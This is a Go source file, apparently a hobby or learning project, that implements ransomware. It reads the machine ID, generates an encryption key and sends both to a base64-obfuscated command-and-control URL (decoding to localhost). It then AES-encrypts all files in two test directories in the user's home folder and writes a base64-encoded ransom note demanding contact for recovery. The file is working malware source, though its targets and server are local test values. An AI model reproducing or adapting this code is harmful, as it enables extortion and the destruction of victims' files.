// Author : Nemuel Wainaina
/*
	https://github.com/nemzyxt
*/

package main

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"math/rand"
	"net/http"
	"os"
	"path/filepath"
	"time"
)

const (
	README string = "Desktop/README.txt"
	NOTE string = "WU9VUiBGSUxFUyBIQVZFIEJFRU4gRU5DUllQVEVEICEhIQpEb24ndCBtYWtlIGFueSBzdHVwaWQgbW92ZSB0byBkZWNyeXB0IHRoZW0gb3IgZWxzZSB5b3Ugd2lsbCBoYXZlIHBlcm1hbmVudGx5IGxvc3QgYWNjZXNzIHRvIHRoZW0gISAKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjClRPIFJFQ09WRVIgVEhFTSA6CkNvbnRhY3QgdXMgaGVyZSBhbmQgcHJvdmlkZSB0aGlzIGFzIHlvdXIgaWQgOgo="
	C2 string = "aHR0cDovLzEyNy4wLjAuMTo4MDgwLwo="
)

func main() {
	move_to_home()

	// generate a random key
	k := generate_key()
	id := generate_id()
	report(k, id)

	// Encrypt the directories now :)
	key := []byte(k)
	encrypt_dir("Test1", []byte(key))
	encrypt_dir("Test2", key)

	// Drop the Ransom Note
	f, _ := os.Create(README)
	f.WriteString(from_b64(NOTE))
	f.Close()
}

func generate_key() string {
	key := make([]byte, 32)
	pool := "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890"
	for i := range key {
		rand.Seed(time.Now().UnixNano())
		key[i] = pool[rand.Intn(len(pool))]
	}
	return string(key)
}

func generate_id() string {
	id, _ := os.ReadFile("/etc/machine-id")
	return string(id)
}

// report details to C2
func report(key string, id string) {
	if !is_online() {
		time.Sleep(5 * time.Second)
		report(key, id)
	}
	msg := id + ":" + key
	http.Get(from_b64(C2) + "/" + to_b64(msg))
}

// return base64 encoding of str
func to_b64(str string) string {
	return base64.StdEncoding.EncodeToString([]byte(str))
}

// decode a base64 string
func from_b64(str string) string {
	res, _ := base64.RawURLEncoding.DecodeString(str)
	return string(res)
}

// change to user's home directory
func move_to_home() {
	homedir, _ := os.UserHomeDir()
	os.Chdir(homedir)
}

// check whether the system is online
func is_online() bool {
	_, err := http.Get("https://www.google.com")
	return err == nil
}

// read the file and return its content
func read_file(file string) []byte {
	content, _ := os.ReadFile(file)
	return content
}

// encrypt the provided file
func encrypt_file(file string, key []byte) {
	c, _ := aes.NewCipher(key)
	gcm, _ := cipher.NewGCM(c)
	nonce := make([]byte, gcm.NonceSize())
	plaintext := read_file(file)
	result := gcm.Seal(nonce, nonce, plaintext, nil)
	os.WriteFile(file, result, 0666)
}

// return a list of all the files in the provided path
func list_files(path string) []string {
	var files []string
	filepath.Walk(path, func(p string, info os.FileInfo, err error) error {
		if !info.IsDir() {
			files = append(files, p)
		}
		return nil
	})
	return files
}

// encrypt all the files in dir
func encrypt_dir(dir string, key []byte) {
	for _, file := range(list_files(dir)) {
		encrypt_file(file, key)
	}
}